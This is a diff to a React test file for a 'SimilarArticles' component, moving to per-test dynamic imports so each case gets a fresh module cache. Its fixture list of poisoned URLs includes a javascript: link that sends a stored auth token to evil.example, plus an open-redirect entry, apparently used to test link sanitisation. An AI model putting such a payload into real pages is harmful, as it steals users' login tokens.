@@ -1,6 +1,6 @@
+import type { ComponentType } from 'react'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import { render, screen, waitFor } from '@testing-library/react'
-import SimilarArticles from './SimilarArticles'
 
 const POISONED_URLS = [
   "javascript:fetch('https://evil.example/?t='+localStorage.getItem('vccircle_auth_token'))",
@@ -13,10 +13,19 @@ const POISONED_URLS = [
   '\\/evil.com',
 ]
 
-// The component no longer fetches per card: it asks the shared client in
-// app/lib/similar.ts, which coalesces a view's cards into one batched
-// request. Each case below gets its own article id, so one case's cached
-// answer cannot answer another case's request.
+// The client in app/lib/similar.ts memoises answers in module state on
+// purpose -- that cache is what stops a remounted card re-fetching. A static
+// top-level import would bind one module instance for the whole file, so the
+// first case's answer would be served to every later one. Each test therefore
+// re-imports the module, which is what gives it an empty cache; within a
+// single test the cache is shared, which is the remount case below.
+interface ArticleListProps {
+  articleId: number | string
+  limit?: number
+  compact?: boolean
+}
+
+let SimilarArticles: ComponentType<ArticleListProps>
 let nextArticleId = 1000
 let mockedArticleId = 0
 
@@ -50,8 +59,14 @@ function renderAndWait(compact: boolean) {
   )
 }
 
-beforeEach(() => {
+// The dynamic import is the one exception to the static-import rule in this
+// repo, and it is the whole point here: a static import binds one module
+// instance for the file, and re-importing after resetModules is what gives
+// each test the empty cache a fresh page load would have.
+beforeEach(async () => {
+  vi.resetModules()
   vi.clearAllMocks()
+  SimilarArticles = (await import('./SimilarArticles')).default
 })
 
 afterEach(() => {
@@ -200,9 +215,10 @@ describe('SimilarArticles — a view costs one request, not one per card', () =>
 
   it('a view wider than the server cap asks again rather than dropping its tail', async () => {
     const fetchMock = mockBatch(oneNear)
-    // Far outside the range the cases above hand out, so this can never be
-    // answered from their cache entries whatever limit they used.
-    const ids = Array.from({ length: 25 }, (_, i) => i + 900000)
+    // Deliberately reuses ids 1-8, which an earlier case already asked for.
+    // Only the per-test module reset keeps that earlier answer from leaking
+    // in, so this case is what proves the isolation is real.
+    const ids = Array.from({ length: 25 }, (_, i) => i + 1)
 
     render(
       <>
